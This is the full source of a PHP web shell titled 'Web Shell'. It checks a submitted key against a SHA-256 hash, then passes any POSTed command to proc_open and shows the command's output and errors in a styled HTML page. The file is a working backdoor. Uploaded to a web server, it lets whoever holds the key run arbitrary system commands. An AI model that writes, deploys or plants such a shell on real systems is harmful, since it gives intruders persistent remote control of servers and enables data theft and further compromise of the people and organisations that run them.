<?php
$hash = '68294cf2dcf09372f59e46bacf9e4fa2dc0822c0ed8d45b0b351f83789625b06';
if (empty($_REQUEST['key']) || hash('sha256', $_REQUEST['key']) != $hash) {
    echo ("Bad key!\n");
    ?>
        <form method="post">
            <input type="text" name="key" value="<?=htmlspecialchars($_REQUEST['key'])?>"></input>
            <button type="submit">Log in</button>
        </form>
<?php
    exit();
}



if (!empty($_POST['cmd'])) {

    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin
       1 => array("pipe", "w"),  // stdout
       2 => array("pipe", "w"),  // stderr
    );
    
    // And, then, execute the test.sh command, using those descriptors, in the current directory, and saying the i/o should be from/to $pipes :
    $process = proc_open($_POST['cmd'], $descriptorspec, $pipes, dirname(__FILE__), null);
    
    // We can now read from the two output pipes :
    $stdout = stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    
    $stderr = stream_get_contents($pipes[2]);
    fclose($pipes[2]);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Web Shell</title>
    <style>
        * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }

        body {
            font-family: sans-serif;
            color: rgba(0, 0, 0, .75);
        }

        main {
            margin: auto;
            max-width: 850px;
        }

        pre,
        input,
        button {
            border-radius: 5px;
        }

        pre,
        input,
        button {
            background-color: #efefef;
        }

        label {
            display: block;
        }

        input {
            width: 100%;
            background-color: #efefef;
            border: 2px solid transparent;
        }

        input:focus {
            outline: none;
            background: transparent;
            border: 2px solid #e6e6e6;
        }

        button {
            border: none;
            cursor: pointer;
            margin-left: 5px;
        }

        button:hover {
            background-color: #e6e6e6;
        }

        pre,
        input,
        button {
            padding: 10px;
        }

        .form-group {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            padding: 15px 0;
        }
    </style>

</head>

<body>
    <main>
        <h1>Web Shell</h1>
        <h2>Execute a command</h2>

        <form method="post">
            <input type="hidden" name="key" value="<?=htmlspecialchars($_REQUEST['key'])?>"></input>
            <label for="cmd"><strong>Command</strong></label>
            <div class="form-group">
                <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
                <button type="submit">Execute</button>
            </div>
        </form>
        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
            <h2>Output</h2>
            <?php if (isset($stdout)): ?>
                <pre><?= htmlspecialchars($stdout, ENT_QUOTES, 'UTF-8') ?></pre>
            <?php else: ?>
                <pre><small>No sdtout.</small></pre>
            <?php endif; ?>
            <h2>Errors</h2>
            <?php if (isset($stderr)): ?>
                <pre><?= htmlspecialchars($stderr, ENT_QUOTES, 'UTF-8') ?></pre>
            <?php else: ?>
                <pre><small>No sdterr.</small></pre>
            <?php endif; ?>
        <?php endif; ?>
    </main>
</body>
</html>

